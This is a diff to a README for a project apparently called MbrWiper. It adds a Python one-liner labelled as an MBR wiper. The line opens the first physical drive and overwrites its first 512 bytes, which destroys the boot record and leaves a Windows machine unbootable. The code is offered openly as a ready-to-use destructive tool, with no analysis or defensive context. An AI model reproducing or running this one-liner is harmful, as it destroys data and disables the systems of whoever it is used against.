@@ -53,6 +53,12 @@ strip MbrWiper.exe
 MbrWiper.exe
 ```
 
+## MBR Wiper in python oneliner
+
+```python
+open("\\\\.\\PHYSICALDRIVE0", "rb+").write(b"a" * 512)
+```
+
 ## Links
 
  - [Github](https://github.com/mauricelambert/MbrWiper/)
